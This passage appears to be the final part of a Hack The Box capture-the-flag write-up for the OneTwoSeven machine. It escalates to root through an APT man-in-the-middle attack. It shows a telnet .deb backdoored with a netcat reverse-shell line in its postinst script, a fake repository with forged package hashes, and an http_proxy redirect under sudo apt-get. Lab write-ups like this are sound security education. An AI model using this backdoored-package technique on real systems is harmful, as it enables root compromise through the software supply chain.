<br><img src="/images/hackthebox/onetwoseven/29.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/30.png" alt="" class="align-center"><br><br></p>

<h2 id="apt-mitm-root-flag">APT MITM, Root Flag</h2>
<p>As <code class="language-plaintext highlighter-rouge">www-admin-data</code>  we can run <code class="language-plaintext highlighter-rouge">apt-get update</code> and <code class="language-plaintext highlighter-rouge">apt-get upgrade</code> as root without a password :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ sudo -l
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
</code></pre></div></div>
<p>Also when using <code class="language-plaintext highlighter-rouge">sudo</code> it doesn’t reset these environment variables : <code class="language-plaintext highlighter-rouge">ftp_proxy</code>, <code class="language-plaintext highlighter-rouge">http_proxy</code>, <code class="language-plaintext highlighter-rouge">https_proxy</code>
We can create a fake apt repository and add a malicious package that gives us code execution. Then we can run a proxy server (burp or anything else) and set the <code class="language-plaintext highlighter-rouge">http_proxy</code> variable to our server. After that we can make the proxy server use our fake repository instead of the real one by adding an entry in <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Finally when we run <code class="language-plaintext highlighter-rouge">apt-get update &amp;&amp; apt-get upgrade</code> it will attempt to install our malicious package that will give us a root shell. This <a href="https://versprite.com/blog/apt-mitm-package-injection/" target="_blank" rel="noopener noreferrer">article</a> was very helpful.<br>
Let’s check the sources that box is using first :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list
# 

# deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

deb http://de.deb.devuan.org/merged ascii main
# deb-src http://de.deb.devuan.org/merged ascii main

deb http://de.deb.devuan.org/merged ascii-security main
# deb-src http://de.deb.devuan.org/merged ascii-security main

deb http://de.deb.devuan.org/merged ascii-updates main
# deb-src http://de.deb.devuan.org/merged ascii-updates main
www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
www-admin-data@onetwoseven:/$ 
</code></pre></div></div>
<p>In <code class="language-plaintext highlighter-rouge">/etc/apt/sources.list.d/onetwoseven.list</code> there’s an entry for <code class="language-plaintext highlighter-rouge">packages.onetwoseven.htb</code>. Let’s use that.<br>
I started another burp listener on port 8181 :
<br><img src="/images/hackthebox/onetwoseven/31.png" alt="" class="align-center"><br><br>
And I added <code class="language-plaintext highlighter-rouge">packages.onetwoseven.htb</code> to my <code class="language-plaintext highlighter-rouge">hosts</code> file and made it point to my ip :
<br><img src="/images/hackthebox/onetwoseven/32.png" alt="" class="align-center"><br><br>
Now any request to <code class="language-plaintext highlighter-rouge">packages.onetwoseven.htb</code> through the proxy server will be sent to my ip. Now we need to create the fake repository and the malicious package.<br>
I chose <code class="language-plaintext highlighter-rouge">telnet</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ dpkg -l | grep telnet
ii  telnet                                 0.17-41                            amd64        basic telnet client
www-admin-data@onetwoseven:/$ apt-cache show telnet 
Package: telnet
Version: 0.17-41
Installed-Size: 157
Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (&gt;= 2.15), libstdc++6 (&gt;= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Size: 72008
MD5sum: 3409d7e40403699b890c68323e200874
SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
</code></pre></div></div>
<p>The version on the box is <code class="language-plaintext highlighter-rouge">0.17-41</code>, I searched for it and downloaded it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# wget ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
--2019-08-29 23:10:54--  http://ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Resolving ftp.br.debian.org (ftp.br.debian.org)... 200.236.31.3, 2801:82:80ff:8000::4
Connecting to ftp.br.debian.org (ftp.br.debian.org)|200.236.31.3|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 72008 (70K) [application/x-debian-package]
Saving to: ‘telnet_0.17-41_amd64.deb’

telnet_0.17-41_amd64.deb                             100%[=====================================================================================================================&gt;]  70.32K   113KB/s    in 0.6s    

2019-08-29 23:10:56 (113 KB/s) - ‘telnet_0.17-41_amd64.deb’ saved [72008/72008]

root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# file telnet_0.17-41_amd64.deb 
telnet_0.17-41_amd64.deb: Debian binary package (format 2.0)
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
</code></pre></div></div>
<p>We will unpack it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -R ./telnet_0.17-41_amd64.deb ./extract
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la ./extract/
total 16
drwxr-xr-x 4 root root 4096 Aug 29 23:12 .
drwxr-xr-x 3 root root 4096 Aug 29 23:12 ..
drwxr-xr-x 2 root root 4096 Nov  7  2016 DEBIAN
drwxr-xr-x 4 root root 4096 Nov  7  2016 usr
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
</code></pre></div></div>
<p>And add a reverse shell payload in the post install script :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# nano postinst
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# cat postinst
#!/bin/sh
# $Id: postinst,v 1.4 2000/08/23 10:08:42 herbert Exp $

set -e

update-alternatives --install /usr/bin/telnet telnet /usr/bin/telnet.netkit 100 \
                    --slave /usr/share/man/man1/telnet.1.gz telnet.1.gz \
                                /usr/share/man/man1/telnet.netkit.1.gz

# Automatically added by dh_installmenu
if [ "$1" = "configure" ] &amp;&amp; [ -x "`which update-menus 2&gt;/dev/null`" ]; then
        update-menus
fi
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1338 &gt;/tmp/f
# End automatically added section

root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# 
</code></pre></div></div>
<p>Then we will pack it again and change the version number :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -b extract/ telnet_0.17-42_amd64.deb
dpkg-deb: building package 'telnet' in 'telnet_0.17-42_amd64.deb'.
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la
total 156
drwxr-xr-x 3 root root  4096 Aug 29 23:18 .
drwxr-xr-x 3 root root  4096 Aug 29 23:16 ..
drwxr-xr-x 4 root root  4096 Aug 29 23:12 extract
-rw-r--r-- 1 root root 72008 Nov 10  2016 telnet_0.17-41_amd64.deb
-rw-r--r-- 1 root root 72176 Aug 29 23:18 telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
</code></pre></div></div>
<p>What’s left is to create the repository, its name will be <code class="language-plaintext highlighter-rouge">devuan</code> as we saw in the sources list :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
</code></pre></div></div>
<p>The path for the package will be :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
</code></pre></div></div>
<p>as we saw in the <code class="language-plaintext highlighter-rouge">apt-cache</code> result :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ apt-cache show telnet 
Package: telnet
Version: 0.17-41
Installed-Size: 157
Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (&gt;= 2.15), libstdc++6 (&gt;= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Size: 72008
MD5sum: 3409d7e40403699b890c68323e200874
SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# mkdir devuan &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir pool &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool# mkdir DEBIAN &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN# mkdir main &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main# mkdir n &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# mkdir netkit-telnet
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# cd netkit-telnet/
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# cp ../../../../../../telnet_0.17-42_amd64.deb .
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
total 80
drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
</code></pre></div></div>
<p>Now we need to create a <code class="language-plaintext highlighter-rouge">Packages</code> file, we’ll copy the stuff from <code class="language-plaintext highlighter-rouge">apt-cache show telnet</code> and change the version number, size and the hashes.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
total 80
drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# md5sum telnet_0.17-42_amd64.deb                                                                                       
2d29b3d5179226f9a772e370c1df05d9  telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# sha256sum telnet_0.17-42_amd64.deb 
77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd  telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">Packages</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Package: telnet
Version: 0.17-42
Installed-Size: 157
Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (&gt;= 2.15), libstdc++6 (&gt;= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
Size: 72176
MD5sum: 2d29b3d5179226f9a772e370c1df05d9
SHA256: 77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd
</code></pre></div></div>
<p>Path for the <code class="language-plaintext highlighter-rouge">Packages</code> file will be <code class="language-plaintext highlighter-rouge">dists/ascii/main/binary-amd64</code>, we know it’s <code class="language-plaintext highlighter-rouge">ascii/main</code> from the sources list :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
</code></pre></div></div>
<p>And <code class="language-plaintext highlighter-rouge">binary-amd64</code> because the package’s architecture is <code class="language-plaintext highlighter-rouge">amd-64</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir dists &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists# mkdir ascii &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii# mkdir main &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main# mkdir binary-amd64 &amp;&amp; cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# cp ../../../../../Packages .
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# 
</code></pre></div></div>
<p>And that’s it for the repository.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# tree
.
├── dists
│   └── ascii
│       └── main
│           └── binary-amd64
│               └── Packages
└── pool
    └── DEBIAN
        └── main
            └── n
                └── netkit-telnet
                    └── telnet_0.17-42_amd64.deb

9 directories, 2 files
</code></pre></div></div>
<p>What’s left is to run a python <code class="language-plaintext highlighter-rouge">http</code> server in <code class="language-plaintext highlighter-rouge">~/Desktop/HTB/boxes/onetwoseven/apt-mitm/</code> and everything is done.<br>
I exported the <code class="language-plaintext highlighter-rouge">http_proxy</code> variable and I ran <code class="language-plaintext highlighter-rouge">apt-get update</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ export http_proxy=http://10.10.xx.xx:8181/
www-admin-data@onetwoseven:/$ sudo apt-get update
</code></pre></div></div>
<p>Then I ran <code class="language-plaintext highlighter-rouge">apt-get upgrade</code> :
<br><img src="/images/hackthebox/onetwoseven/33.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/34.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/unattended/">Hack The Box - Unattended</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-08-31T07:00:00+02:00">August 31, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/pwn/collision/" class="pagination--pager" title="pwnable.kr - collision
">Previous</a>
    
    
      <a href="/hack-the-box/bastion-2/" class="pagination--pager" title="Hack The Box - Bastion (Commando)
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
